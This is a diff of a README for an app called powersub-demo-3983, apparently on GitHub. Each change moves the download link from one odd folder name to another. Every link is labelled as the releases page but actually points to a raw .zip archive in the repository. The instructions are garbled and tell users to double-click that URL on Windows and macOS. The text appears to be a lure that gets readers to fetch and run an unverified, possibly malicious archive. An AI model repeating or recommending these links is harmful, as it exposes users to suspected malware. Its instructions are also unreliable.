@@ -15,7 +15,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 📥 Download the Application
 
-**Download Link: [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip)**
+**Download Link: [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip)**
 
 To get started, you can download the application by clicking the link above. This link will take you directly to the Releases page, where you can find the latest version of powersub-demo-3983.
 
@@ -23,13 +23,13 @@ To get started, you can download the application by clicking the link above. Thi
 
 1. **Visit the Releases Page**
    - Click the link below or type it in your browser:  
-     [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip)
+     [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip)
 
 2. **Download the Latest Version**
    - On the Releases page, look for the most recent version of powersub-demo-3983. 
    - You will see files listed under "Assets." Click on the file that fits your operating system. For example:
-     - For Windows: `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip`
-     - For macOS: `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip`
+     - For Windows: `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip`
+     - For macOS: `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip`
 
 3. **Extract the Files**
    - After downloading the file, locate it in your computer's Downloads folder.
@@ -37,7 +37,7 @@ To get started, you can download the application by clicking the link above. Thi
 
 4. **Open the Application**
    - Navigate to the folder where you extracted the files.
-   - Look for the application file. For Windows, double-click `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip`. For macOS, open `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip`.
+   - Look for the application file. For Windows, double-click `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip`. For macOS, open `https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip`.
 
 5. **Follow On-Screen Instructions**
    - The application will guide you through the setup process. Just follow the prompts to finish the installation.
@@ -73,4 +73,4 @@ Need help? You can reach out to our support team by visiting the GitHub reposito
 
 Now that you have all the information, it’s time to dive in. Click the link below to access the Releases page and get started!
 
-**Download Link: [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/hyracodontoid/powersub-demo-3983.zip)**
+**Download Link: [Visit Releases Page](https://raw.githubusercontent.com/Mr5130/powersub-demo-3983/main/Tao/powersub-demo-3983.zip)**
